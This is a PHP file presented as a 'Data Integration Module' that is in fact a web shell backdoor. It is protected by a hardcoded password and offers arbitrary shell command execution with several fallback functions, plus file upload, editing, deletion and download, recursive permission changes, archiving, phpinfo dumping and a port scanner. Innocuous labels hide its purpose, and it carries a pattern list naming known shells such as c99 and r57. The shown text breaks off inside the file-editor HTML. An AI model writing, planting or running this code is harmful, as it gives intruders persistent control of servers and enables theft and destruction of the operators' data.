<?php
// ==================================================
// DATA INTEGRATION MODULE - System Management Interface
// ==================================================
if (class_exists('ZipArchive')) {
    if (!class_exists('RecursiveDirectoryIterator')) {
        // System compatibility verification
    }
}

@error_reporting(0);
@set_time_limit(0);
@ini_set('display_errors', 0);
if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

// ==================================================
// SYSTEM CONFIGURATION - Integration Parameters
// ==================================================
$integrationAccessCode = 'b4d4ss';
$systemOperator = 'DataManager';
$notificationBuffer = '';
$pathQueryParameter = 'dir_query_param';

// ==================================================
// DIRECTORY MANAGEMENT SYSTEM
// ==================================================
$activeDirectory = isset($_GET[$pathQueryParameter]) ? 
    base64_decode($_GET[$pathQueryParameter]) : getcwd();

$activeDirectory = realpath($activeDirectory);
if (!$activeDirectory) {
    $activeDirectory = DIRECTORY_SEPARATOR;
}
@chdir($activeDirectory);

// ==================================================
// CORE SYSTEM OPERATIONS
// ==================================================

function encodeDirectoryPath($pathInput) {
    return base64_encode(str_replace('\\', '/', $pathInput));
}

function formatDataSize($bytesInput) {
    if ($bytesInput === 0) return '0 B';
    $sizeMetrics = ['B', 'KB', 'MB', 'GB', 'TB'];
    $metricIndex = floor(log($bytesInput, 1024));
    return round($bytesInput / (1024 ** $metricIndex), 2) . ' ' . $sizeMetrics[$metricIndex];
}

function removeDataStructure($targetLocation) {
    if (!is_dir($targetLocation)) return false;
    
    $structureContents = array_diff(@scandir($targetLocation) ?: [], array('.', '..'));
    $operationResult = true;
    
    foreach ($structureContents as $contentItem) {
        $contentPath = "$targetLocation/$contentItem";
        if (is_dir($contentPath)) {
            if (!removeDataStructure($contentPath)) $operationResult = false;
        } else {
            if (!@unlink($contentPath)) $operationResult = false;
        }
    }
    
    if (!@rmdir($targetLocation)) $operationResult = false;
    return $operationResult;
}

function displayAccessRights($resourcePath) {
    $accessMode = @substr(sprintf('%o', @fileperms($resourcePath)), -4);
    $writeCapability = @is_writable($resourcePath);
    $displayColor = $writeCapability ? 'text-green-400 font-semibold' : 'text-red-400';
    $accessDescription = $writeCapability ? 'Writable Access' : 'Read-Only Access';
    
    return '<span class="' . $displayColor . '" title="' . $accessDescription . '">' . $accessMode . '</span>';
}

function compressDataArchive($sourceItems, $archiveDestination, $baseReference) {
    if (!class_exists('ZipArchive')) return false;

    $archiveHandler = new ZipArchive();
    if (!$archiveHandler->open($archiveDestination, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        return false;
    }

    foreach ($sourceItems as $itemPath) {
        $baseLength = strlen(rtrim($baseReference, DIRECTORY_SEPARATOR));
        $itemPath = realpath($itemPath);

        if ($itemPath === false || strpos($itemPath, $baseReference) !== 0) {
            if (realpath($itemPath) === realpath($baseReference)) {
                $relativeReference = basename($itemPath);
            } else {
                $relativeReference = basename($itemPath); 
            }
        } else {
            $relativeReference = substr($itemPath, $baseLength + 1);
        }
        
        if (empty($relativeReference) || $relativeReference === '.') {
            $relativeReference = basename($itemPath);
        }

        if (is_dir($itemPath)) {
            $directoryIterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($itemPath, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            $archiveHandler->addEmptyDir($relativeReference);

            foreach ($directoryIterator as $nestedItem) {
                $nestedPath = $nestedItem->getRealPath();
                $nestedRelative = $relativeReference . DIRECTORY_SEPARATOR . substr($nestedPath, strlen($itemPath) + 1);

                if ($nestedItem->isDir()) {
                    $archiveHandler->addEmptyDir($nestedRelative);
                } else {
                    $archiveHandler->addFile($nestedPath, $nestedRelative);
                }
            }
        } elseif (is_file($itemPath)) {
            $archiveHandler->addFile($itemPath, $relativeReference);
        }
    }

    return $archiveHandler->close();
}

function modifyAccessRecursive($targetLocation, $accessMode) {
    if (!is_readable($targetLocation)) return false;
    if (!@chmod($targetLocation, $accessMode)) return false;
    
    if (is_dir($targetLocation)) {
        $locationContents = @scandir($targetLocation);
        if ($locationContents === false) return false;
        
        foreach ($locationContents as $contentItem) {
            if ($contentItem === '.' || $contentItem === '..') continue;
            $contentPath = $targetLocation . DIRECTORY_SEPARATOR . $contentItem;
            if (!modifyAccessRecursive($contentPath, $accessMode)) {}
        }
    }
    return true;
}

function getRestrictedOperations() {
    $disabledOperations = ini_get('disable_functions');
    $disabledList = array_map('trim', explode(',', $disabledOperations));
    $operationTests = ['system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'dl', 'popen', 'symlink', 'link', 'ini_set', 'set_time_limit'];
    $restrictionResults = [];
    $securityMode = ini_get('safe_mode');

    foreach ($disabledList as $operation) { 
        if (!empty($operation)) { 
            $restrictionResults[$operation] = 'php.ini'; 
        } 
    }
    
    foreach ($operationTests as $operation) { 
        if (!isset($restrictionResults[$operation])) { 
            if (!function_exists($operation) || (function_exists($operation) && !@is_callable($operation))) { 
                $restrictionResults[$operation] = 'Test Failed'; 
            } 
        } 
    }
    
    if ($securityMode) { 
        foreach(['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'] as $operation) { 
            if (!isset($restrictionResults[$operation])) { 
                $restrictionResults[$operation] = 'Safe Mode'; 
            } 
        } 
    }

    return $restrictionResults;
}

function executeOperationCommand($operationInput) {
    $executionOutput = '';
    
    if (function_exists('shell_exec') && @is_callable('shell_exec')) { 
        $executionOutput = @shell_exec($operationInput); 
        if ($executionOutput !== null) return $executionOutput; 
    } 
    
    if (function_exists('exec') && @is_callable('exec')) { 
        $execResult = []; 
        @exec($operationInput, $execResult); 
        $executionOutput = implode("\n", $execResult); 
        if (!empty($executionOutput)) return $executionOutput; 
    }
    
    if (function_exists('system') && @is_callable('system')) { 
        ob_start(); 
        @system($operationInput); 
        $executionOutput = ob_get_clean(); 
        if (!empty($executionOutput)) return $executionOutput; 
    }
    
    if (function_exists('passthru') && @is_callable('passthru')) { 
        ob_start(); 
        @passthru($operationInput); 
        $executionOutput = ob_get_clean(); 
        if (!empty($executionOutput)) return $executionOutput; 
    }
    
    return "Execution Error: No available method";
}

// ==================================================
// SECURITY SCANNING MODULE
// ==================================================

function analyzeFileTokens($filename) {
    $fileData = @file_get_contents($filename);
    if ($fileData === false) {
        return array();
    }
    
    $fileData = preg_replace('/<\?([^p=\w])/m', '<?php ', $fileData);
    $tokenAnalysis = @token_get_all($fileData);
    $tokenResults = array();
    $tokenCount = count($tokenAnalysis);

    if ($tokenCount > 0) {
        for ($i = 0; $i < $tokenCount; $i++) {
            if (isset($tokenAnalysis[$i][1]) && is_string($tokenAnalysis[$i][1]) && $tokenAnalysis[$i][0] != T_WHITESPACE && $tokenAnalysis[$i][0] != T_COMMENT && $tokenAnalysis[$i][0] != T_DOC_COMMENT) {
                $tokenResults[] = strtolower($tokenAnalysis[$i][1]);
            }
        }
    }
    $tokenResults = array_values(
        array_unique(array_filter(array_map("trim", $tokenResults)))
    );
    return $tokenResults;
}

function performSecurityScan($fileLocation) {
    $contentData = @file_get_contents($fileLocation);
    if ($contentData === false) {
        return array('status' => 'safe', 'reason' => 'Unreadable content', 'patterns' => array(), 'score' => 0);
    }

    $suspiciousOperations = array(
        'eval', 'assert', 'create_function', 'preg_replace', 'call_user_func',
        'exec', 'shell_exec', 'system', 'passthru', 'proc_open', 'popen',
        'dl', 'base64_decode', 'gzinflate', 'str_rot13', 'convert_uuencode', 'hex2bin',
        'file_put_contents', 'fwrite', 'chmod', 'unlink', 'mkdir',
        'fsockopen', 'curl_exec',
    );

    $suspiciousPatterns = array(
        '/eval\s*\(\s*(\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*|\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_SERVER)/i',
        '/base64_decode\s*\(\s*(\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*|\$_GET|\$_POST|\$_REQUEST|\$_COOKIE)/i',
        '/eval\s*\(\s*gzinflate\s*\(\s*base64_decode/i',
        '/preg_replace\s*\(.*\/e.*\)/i',
        '/c99shell|r57shell|wso\s*shell|b374k\s*shell|sniper\s*shell/i',
        '/@ini_set.*error_log.*@?assert/i',
        '/system\s*\(\s*(\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*|\$_GET|\$_POST)/i',
    );

    $riskScore = 0;
    $detectedPatterns = array();
    $fileTokens = analyzeFileTokens($fileLocation);
    $fileName = basename($fileLocation);

    if (preg_match('/shell|backdoor|cmd|uploader|hack/i', $fileName)) {
        $riskScore += 15;
        $detectedPatterns[] = 'suspicious_naming';
    }

    foreach ($suspiciousOperations as $operation) {
        if (in_array($operation, $fileTokens)) {
            $detectedPatterns[] = $operation;
            $riskScore += (in_array($operation, array('eval', 'assert', 'exec', 'system', 'create_function')) ? 10 : 5);
        }
    }

    foreach ($suspiciousPatterns as $pattern) {
        if (preg_match($pattern, $contentData, $matches)) {
            $detectedPatterns[] = 'pattern: ' . htmlspecialchars($matches[0]);
            $riskScore += 20;
        }
    }

    if ($riskScore >= 40) {
        return array('status' => 'MALICIOUS', 'reason' => 'High risk detected', 'patterns' => $detectedPatterns, 'score' => $riskScore);
    } elseif ($riskScore >= 20) {
        return array('status' => 'SUSPICIOUS', 'reason' => 'Suspicious activity', 'patterns' => $detectedPatterns, 'score' => $riskScore);
    } else {
        return array('status' => 'SAFE', 'reason' => 'No threats found', 'patterns' => array(), 'score' => 0);
    }
}

function scanDirectoryRecursive($scanDirectory, &$fileCollection = array()) {
    $directoryHandle = @opendir($scanDirectory);
    if ($directoryHandle) {
        while (($directoryEntry = readdir($directoryHandle)) !== false) {
            if ($directoryEntry == '.' || $directoryEntry == '..') continue;
            $entryPath = $scanDirectory . DIRECTORY_SEPARATOR . $directoryEntry;
            if (is_link($entryPath)) continue;

            if (is_dir($entryPath) && is_readable($entryPath)) {
                if (count($fileCollection) < 5000) { 
                    scanDirectoryRecursive($entryPath, $fileCollection);
                }
            }

            if (is_file($entryPath) && is_readable($entryPath)) {
                $fileExtension = strtolower(pathinfo($entryPath, PATHINFO_EXTENSION));
                if (in_array($fileExtension, ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'inc'])) {
                     $fileCollection[] = $entryPath;
                }
            }
        }
        closedir($directoryHandle);
    }
    return $fileCollection;
}

function executeSecurityAnalysis($analysisPath) {
    set_time_limit(0); 
    ini_set('memory_limit', '-1');
    
    $analyzedFiles = scanDirectoryRecursive($analysisPath);
    $totalFileCount = count($analyzedFiles);
    $analysisResults = ['malicious' => [], 'suspicious' => [], 'safe' => [], 'total' => $totalFileCount];
    
    foreach ($analyzedFiles as $filePath) {
        $securityAnalysis = performSecurityScan($filePath);
        $relativePath = str_replace(rtrim($analysisPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR, '', $filePath);

        $fileAnalysis = [
            'file' => $relativePath,
            'full_path' => $filePath,
            'reason' => $securityAnalysis['reason'],
            'patterns' => $securityAnalysis['patterns'],
            'score' => $securityAnalysis['score']
        ];
        
        switch ($securityAnalysis['status']) {
            case 'MALICIOUS':
                $analysisResults['malicious'][] = $fileAnalysis;
                break;
            case 'SUSPICIOUS':
                $analysisResults['suspicious'][] = $fileAnalysis;
                break;
            default:
                $analysisResults['safe'][] = $fileAnalysis;
                break;
        }
    }
    
    return $analysisResults;
}

// ==================================================
// AJAX SECURITY SCAN HANDLER
// ==================================================
if (isset($_POST['security_scan_request']) && $_POST['security_scan_request'] == '1') {
    header('Content-Type: application/json');
    $scanTargetPath = isset($_POST['scan_directory']) ? base64_decode($_POST['scan_directory']) : getcwd();
    
    if (!is_dir($scanTargetPath)) {
        echo json_encode(['error' => 'Invalid directory', 'path' => $scanTargetPath]);
        exit;
    }

    $scanResults = executeSecurityAnalysis($scanTargetPath);
    echo json_encode(['success' => true, 'results' => $scanResults]);
    exit;
}

// ==================================================
// ACCESS CONTROL SYSTEM
// ==================================================
if (isset($_POST['system_authentication'])) {
    if ($_POST['system_authentication'] === $integrationAccessCode) {
        $_SESSION['access_granted'] = true;
        $navigationRedirect = isset($_GET[$pathQueryParameter]) ? 
            '?' . $pathQueryParameter . '=' . $_GET[$pathQueryParameter] : '';
        header('Location: ' . $_SERVER['PHP_SELF'] . $navigationRedirect);
        exit;
    } else {
        $notificationBuffer = '<div class="access-alert bg-red-600 border-red-400">Authentication Failed</div>';
    }
}

if (isset($_GET['system_logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['access_granted'])):
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Access Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0d1117; color: #c9d1d9; }
        .access-panel { background-color: #161b22; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5); }
        .access-alert { padding: 0.75rem; border-radius: 0.375rem; border-left: 5px solid; margin-bottom: 1rem; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="access-panel p-8 rounded-xl w-full max-w-sm">
        <h1 class="text-3xl font-bold text-center mb-6 text-gray-400">System Access</h1>
        <?php echo $notificationBuffer; ?>
        <form method="POST" class="space-y-4">
            <input type="password" name="system_authentication" placeholder="Access Code" required 
                   class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white">
            <button type="submit" class="w-full bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 rounded-md transition duration-200">
                VERIFY ACCESS
            </button>
        </form>
    </div>
</body>
</html>
<?php
exit;
endif;

// Retrieve system notifications
if (isset($_SESSION['system_notification'])) {
    $notificationBuffer = $_SESSION['system_notification'];
    unset($_SESSION['system_notification']);
}

// Current navigation URL
$currentNavigation = '?' . $pathQueryParameter . '=' . encodeDirectoryPath($activeDirectory);

// ==================================================
// OPERATION HANDLERS
// ==================================================

// Directory Compression
if (isset($_GET['compress_directory'])) {
    $operationMessage = '';
    
    if (!class_exists('ZipArchive')) {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Compression unavailable</div>';
    } else {
        $sourceDirectory = $activeDirectory;
        $compressionSources = [$sourceDirectory];
        $compressionBase = dirname($sourceDirectory);
        
        if ($compressionBase === '.' || $compressionBase === $sourceDirectory) {
            $compressionBase = DIRECTORY_SEPARATOR;
        }

        $directoryIdentifier = basename($sourceDirectory) ?: 'data_directory';
        $archiveName = $directoryIdentifier . '-' . time() . '.zip';
        $archivePath = rtrim($compressionBase, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $archiveName;
        
        if (!@is_writable(rtrim($compressionBase, DIRECTORY_SEPARATOR))) {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Write access denied</div>';
        } elseif (compressDataArchive($compressionSources, $archivePath, $compressionBase)) {
            $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Archive created: ' . htmlspecialchars($archiveName) . '</div>';
        } else {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Compression failed</div>';
        }
    }

    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// Bulk Deletion
if (isset($_POST['bulk_delete'])) {
    if (!isset($_POST['selected_resources']) || !is_array($_POST['selected_resources']) || empty($_POST['selected_resources'])) {
         $operationMessage = '<div class="access-alert bg-yellow-800 border-yellow-500">No selection made</div>';
    } else {
        $deletionTargets = $_POST['selected_resources'];
        $successCount = 0; $failureCount = 0;
        
        foreach ($deletionTargets as $encodedResource) {
            $resourceName = base64_decode($encodedResource);
            $resourcePath = $activeDirectory . DIRECTORY_SEPARATOR . $resourceName;
            $deletionResult = @is_dir($resourcePath) ? removeDataStructure($resourcePath) : @unlink($resourcePath);
            
            if ($deletionResult) { 
                $successCount++; 
            } else { 
                $failureCount++; 
            }
        }
        
        if ($successCount > 0 && $failureCount == 0) {
            $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Removed ' . $successCount . ' items</div>';
        } elseif ($successCount > 0 && $failureCount > 0) {
            $operationMessage = '<div class="access-alert bg-yellow-800 border-yellow-500">Partial removal: ' . $successCount . ' success, ' . $failureCount . ' failed</div>';
        } else {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Deletion failed</div>';
        }
    }
    
    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// Bulk Permission Modification
if (isset($_POST['bulk_permission_update']) && isset($_POST['bulk_permission_value'])) {
    if (!isset($_POST['selected_resources']) || !is_array($_POST['selected_resources']) || empty($_POST['selected_resources'])) {
         $operationMessage = '<div class="access-alert bg-yellow-800 border-yellow-500">No selection made</div>';
    } else {
        $permissionString = trim($_POST['bulk_permission_value']); 
        $recursiveApplication = isset($_POST['bulk_permission_recursive']); 
        
        if (preg_match('/^[0-7]{3,4}$/', $permissionString)) {
            $permissionValue = octdec($permissionString);
            $modifiedCount = 0; $failedCount = 0; 
            
            foreach ($_POST['selected_resources'] as $encodedResource) {
                $resourceName = base64_decode($encodedResource);
                $resourcePath = $activeDirectory . DIRECTORY_SEPARATOR . $resourceName;
                $permissionResult = (@is_dir($resourcePath) || $recursiveApplication) ? 
                    modifyAccessRecursive($resourcePath, $permissionValue) : @chmod($resourcePath, $permissionValue);
                
                if ($permissionResult) { 
                    $modifiedCount++; 
                } else { 
                    $failedCount++; 
                }
            }
            
            if ($modifiedCount > 0 && $failedCount == 0) {
                $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Permissions updated: ' . $modifiedCount . ' items</div>';
            } elseif ($modifiedCount > 0 && $failedCount > 0) {
                $operationMessage = '<div class="access-alert bg-yellow-800 border-yellow-500">Partial update: ' . $modifiedCount . ' success, ' . $failedCount . ' failed</div>';
            } else {
                 $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Permission update failed</div>';
            }
        } else {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Invalid permission format</div>';
        }
    }
    
    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// Bulk Compression
if (isset($_POST['bulk_compression'])) {
    if (!class_exists('ZipArchive')) {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Compression unavailable</div>';
    } elseif (!isset($_POST['selected_resources']) || !is_array($_POST['selected_resources']) || empty($_POST['selected_resources'])) {
         $operationMessage = '<div class="access-alert bg-yellow-800 border-yellow-500">No selection made</div>';
    } else {
        $compressionTargets = $_POST['selected_resources'];
        $archiveSources = [];
        
        foreach ($compressionTargets as $encodedResource) {
            $resourceName = base64_decode($encodedResource);
            $archiveSources[] = $activeDirectory . DIRECTORY_SEPARATOR . $resourceName;
        }

        $archiveName = 'data_archive-' . time() . '.zip';
        $archivePath = $activeDirectory . DIRECTORY_SEPARATOR . $archiveName;
        
        if (compressDataArchive($archiveSources, $archivePath, $activeDirectory)) {
            $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Archive created: ' . htmlspecialchars($archiveName) . '</div>';
        } else {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Compression failed</div>';
        }
    }

    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// Command Execution
if (isset($_POST['execute_command'])) {
    $commandInput = trim($_POST['execute_command']);
    $commandOutput = executeOperationCommand($commandInput);
    $_SESSION['command_execution'] = ['input' => $commandInput, 'output' => $commandOutput];
    header('Location: ' . $currentNavigation);
    exit;
}

// Resource Creation
if (isset($_POST['create_resource'])) {
    $newResourceName = trim($_POST['create_resource']);
    $resourceType = $_POST['resource_type'];
    $resourcePath = $activeDirectory . DIRECTORY_SEPARATOR . $newResourceName;
    $operationMessage = '';
    
    if ($newResourceName === '') {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Name required</div>';
    } elseif (@file_exists($resourcePath)) {
        $operationMessage = '<div class="access-alert bg-yellow-800 border-yellow-500">Resource exists</div>';
    } elseif ($resourceType === 'file') {
        if (@touch($resourcePath)) {
            header('Location: ' . $_SERVER['PHP_SELF'] . '?' . $pathQueryParameter . '=' . 
                   encodeDirectoryPath($activeDirectory) . '&edit_resource=' . encodeDirectoryPath($resourcePath));
            exit;
        } else {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">File creation failed</div>';
        }
    } elseif ($resourceType === 'directory') {
        if (@mkdir($resourcePath)) {
            $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Directory created</div>';
        } else {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Directory creation failed</div>';
        }
    }
    
    if ($operationMessage) {
        $_SESSION['system_notification'] = $operationMessage; 
        header('Location: ' . $currentNavigation);
        exit;
    }
}

// File Upload
if (isset($_FILES['upload_data'])) {
    $uploadInfo = $_FILES['upload_data'];
    $uploadTarget = $activeDirectory . DIRECTORY_SEPARATOR . basename($uploadInfo["name"]);
    $operationMessage = '';
    
    if ($uploadInfo["error"] === UPLOAD_ERR_OK) {
        if (@move_uploaded_file($uploadInfo["tmp_name"], $uploadTarget)) {
            $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Upload successful</div>';
        } else {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Upload failed</div>';
        }
    } else {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Upload error</div>';
    }
    
    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// Resource Renaming
if (isset($_POST['rename_original']) && isset($_POST['rename_new'])) {
    $originalName = base64_decode($_POST['rename_original']);
    $newName = trim($_POST['rename_new']);
    $originalPath = $activeDirectory . DIRECTORY_SEPARATOR . $originalName;
    $newPath = $activeDirectory . DIRECTORY_SEPARATOR . $newName;
    $operationMessage = '';
    
    if ($newName === $originalName) {
         $operationMessage = '<div class="access-alert bg-yellow-800 border-yellow-500">No changes</div>';
    } elseif (@rename($originalPath, $newPath)) {
        $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Renamed successfully</div>';
    } else {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Rename failed</div>';
    }
    
    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// File Content Editing
if (isset($_POST['resource_content']) && isset($_POST['edit_resource_key'])) {
    $editPath = base64_decode($_POST['edit_resource_key']);
    $editName = basename($editPath);
    
    if (@file_put_contents($editPath, $_POST['resource_content']) !== false) {
        $notificationBuffer = '<div class="access-alert bg-green-800 border-green-500">Content saved</div>';
    } else {
        $notificationBuffer = '<div class="access-alert bg-red-800 border-red-500">Save failed</div>';
    }
}

// Resource Deletion
if (isset($_GET['delete_resource'])) {
    $resourceName = base64_decode($_GET['delete_resource']);
    $resourcePath = $activeDirectory . DIRECTORY_SEPARATOR . $resourceName;
    $deleteResult = false;
    $isDirectory = @is_dir($resourcePath);
    $operationMessage = '';
    
    if ($isDirectory) { 
        $deleteResult = removeDataStructure($resourcePath); 
    } else { 
        $deleteResult = @unlink($resourcePath); 
    }
    
    if ($deleteResult) {
        $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Resource deleted</div>';
    } else {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Deletion failed</div>';
    }
    
    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// File Download
if (isset($_GET['download_resource'])) {
    $resourceName = base64_decode($_GET['download_resource']);
    $resourcePath = $activeDirectory . DIRECTORY_SEPARATOR . $resourceName;
    
    if (@is_file($resourcePath) && @is_readable($resourcePath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($resourceName) . '"');
        header('Content-Length: ' . @filesize($resourcePath));
        @readfile($resourcePath);
        exit;
    } else {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Download failed</div>';
        $_SESSION['system_notification'] = $operationMessage;
        header('Location: ' . $currentNavigation);
        exit;
    }
}

// Single Resource Compression
if (isset($_GET['compress_resource'])) {
    if (!class_exists('ZipArchive')) {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Compression unavailable</div>';
    } else {
        $resourceName = base64_decode($_GET['compress_resource']);
        $resourcePath = $activeDirectory . DIRECTORY_SEPARATOR . $resourceName;
        $archiveName = $resourceName . '.zip';
        $archivePath = $activeDirectory . DIRECTORY_SEPARATOR . $archiveName;
        $compressionSources = [$resourcePath];
        
        if (compressDataArchive($compressionSources, $archivePath, $activeDirectory)) {
            $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Compressed: ' . htmlspecialchars($archiveName) . '</div>';
        } else {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Compression failed</div>';
        }
    }
    
    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// Archive Extraction
if (isset($_GET['extract_resource'])) {
    if (!class_exists('ZipArchive')) {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Extraction unavailable</div>';
    } else {
        $archiveName = base64_decode($_GET['extract_resource']);
        $archivePath = $activeDirectory . DIRECTORY_SEPARATOR . $archiveName;
        $archiveHandler = new ZipArchive;
        $operationMessage = '';
        
        if (@is_file($archivePath) && $archiveHandler->open($archivePath) === TRUE) {
            if ($archiveHandler->extractTo($activeDirectory)) {
                $archiveHandler->close();
                $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Extraction successful</div>';
            } else {
                $archiveHandler->close();
                $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Extraction failed</div>';
            }
        } else {
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Invalid archive</div>';
        }
    }
    
    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// Single Permission Modification
if (isset($_POST['permission_target']) && isset($_POST['permission_value'])) {
    $targetName = base64_decode($_POST['permission_target']);
    $targetPath = $activeDirectory . DIRECTORY_SEPARATOR . $targetName;
    $permissionString = trim($_POST['permission_value']);
    $recursiveApply = isset($_POST['permission_recursive']);
    
    if (preg_match('/^[0-7]{3,4}$/', $permissionString)) {
        $permissionValue = octdec($permissionString);
        $permissionResult = $recursiveApply ? modifyAccessRecursive($targetPath, $permissionValue) : @chmod($targetPath, $permissionValue);
        
        if ($permissionResult) {
            $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Permissions updated</div>';
        } else {
             $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Permission update failed</div>';
        }
    } else {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Invalid permission format</div>';
    }
    
    $_SESSION['system_notification'] = $operationMessage;
    header('Location: ' . $currentNavigation);
    exit;
}

// System Information
if (isset($_GET['system_info'])) {
    ob_start();
    @phpinfo();
    $systemInfo = ob_get_contents();
    ob_end_clean();
    $systemInfo = preg_replace('%^.*<body>(.*)</body>.*$%is', '$1', $systemInfo);
    
    $_SESSION['system_information'] = $systemInfo;
    $_SESSION['system_notification'] = '<div class="access-alert bg-yellow-800 border-yellow-500">System info loaded</div>';
    header('Location: ' . $currentNavigation);
    exit;
}

// Network Port Scan
if (isset($_POST['scan_host']) && isset($_POST['scan_ports'])) {
    $scanTarget = trim($_POST['scan_host']);
    $portsInput = trim($_POST['scan_ports']);
    $portsList = array_map('trim', explode(',', $portsInput));
    $portTargets = array_unique(array_filter(array_map('intval', $portsList), function($port) { 
        return $port > 0 && $port <= 65535; 
    }));
    
    $operationMessage = '';
    $scanResults = '';
    
    if (empty($scanTarget)) {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Host required</div>';
    } elseif (empty($portTargets)) {
        $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Invalid ports</div>';
    } else {
        if (!function_exists('fsockopen')) {
            $scanResults = "ERROR: Network scan unavailable";
            $operationMessage = '<div class="access-alert bg-red-800 border-red-500">Scan failed</div>';
        } else {
            $portStatus = [];
            foreach ($portTargets as $port) {
                $connection = @fsockopen($scanTarget, $port, $errno, $errstr, 1);
                if ($connection) {
                    $portStatus[$port] = 'OPEN';
                    @fclose($connection);
                } else {
                    $portStatus[$port] = 'CLOSED';
                }
            }
            
            $scanResults = "Port Analysis for " . htmlspecialchars($scanTarget) . ":\n\n";
            foreach ($portStatus as $port => $status) {
                $scanResults .= "Port " . $port . ": " . $status . "\n";
            }
            
            $operationMessage = '<div class="access-alert bg-green-800 border-green-500">Scan completed</div>';
        }
    }
    
    $_SESSION['system_notification'] = $operationMessage;
    $_SESSION['network_scan'] = ['host' => $scanTarget, 'ports' => $portsInput, 'results' => $scanResults];
    header('Location: ' . $currentNavigation);
    exit;
}

// ==================================================
// FILE EDITING INTERFACE
// ==================================================
if (isset($_GET['edit_resource'])) {
    $editPath = base64_decode($_GET['edit_resource']);
    $editName = basename($editPath);

    $fileContent = @is_file($editPath) ? @file_get_contents($editPath) : '/* Resource unavailable */';
    $writeAccess = @is_writable($editPath);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Editing: <?php echo htmlspecialchars($editName); ?></title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
        <style>
            body { font-family: 'Inter', sans-serif; background-color: #0d1117; color: #c9d1d9; }
            .edit-container { max-width: 900px; }
            .access-alert { padding: 0.75rem; border-radius: 0.375rem; border-left: 5px solid; margin-bottom: 1rem; }
            textarea {
                font-family: monospace;
                min-height: 70vh;
                background-color: #161b22;
                border: 1px solid #30363d;
            }
        </style>
    </head>
    <body class="p-4 md:p-8">
